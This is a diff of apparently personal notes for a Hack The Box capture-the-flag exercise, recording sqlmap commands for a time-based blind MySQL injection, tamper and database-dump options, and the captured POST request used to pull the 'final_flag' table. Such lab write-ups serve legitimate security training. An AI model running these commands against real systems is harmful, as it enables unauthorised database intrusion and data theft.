@@ -1,7 +1,7 @@
 ###Final test
 ## rough draft
 # visit target host and recon for entry point
-# find exploit for DB, find db type (probably mysql), find db table, determine if possible dba
+# find exploit for DB, find db type (probably mysql), find db table ('final_flag' found in HTB question), determine if possible dba
 
 TGTHOST=""
 UINHOST=""
@@ -9,7 +9,7 @@ UINPROTO=""
 
 TGTHOST=$UINHOST$UINPROTO
 
-sqlmap --batch --dump -u '$TGTHOST' --random-agent --dump --batch --level 5 --risk 3
+sqlmap --batch --dump -u '$TGTHOST' --random-agent --dump --batch --level 5 --risk 3 -t final_flag
 
 # Flag regex: (HTB{.+})
 
@@ -17,3 +17,31 @@ sqlmap --batch --dump -u '$TGTHOST' --random-agent --dump --batch --level 5 --ri
 # inspecting the page network traffic we find the request payload raw showing '{"id":1}'
 # ran command to get max result, probably not best for realworld
 sqlmap --batch --dump -u '$TGTHOST' --random-agent --dump --batch --level 5 --risk 3
+
+
+#changed to -r method with request file and quickly found dbms is mysql so changed command options to narrow focus.
+sqlmap -r req.txt --dump --batch --random-agent --banner --current-user --current-db --is-dba --dbms=mysql
+
+# after a while it was found that it was MySQL >= 5.0.12 AND time-based blind (query SLEEP) injectable with 
+# shortly later found --tamper between. re-ran with below command.
+# also found table as 'production' with the table in the question 'final_flag'
+# put time-sec=2 as this was found with a few re-runs with the command and showings as the result.
+sqlmap -r req.txt --dump --batch --random-agent --dbms=mysql --technique=T --tamper=between -t final_flag --time-sec=2 -D production -T final_flag
+
+  req.txt:
+  POST /action.php HTTP/1.1
+  Host: $TGTHOST
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+  Accept: */*
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Referer: http://$TGTHOST/shop.html
+  Content-Type: application/json
+  Content-Length: 8
+  Origin: http://$TGTHOST
+  DNT: 1
+  Connection: keep-alive
+  Sec-GPC: 1
+  Pragma: no-cache
+  Cache-Control: no-cache
+
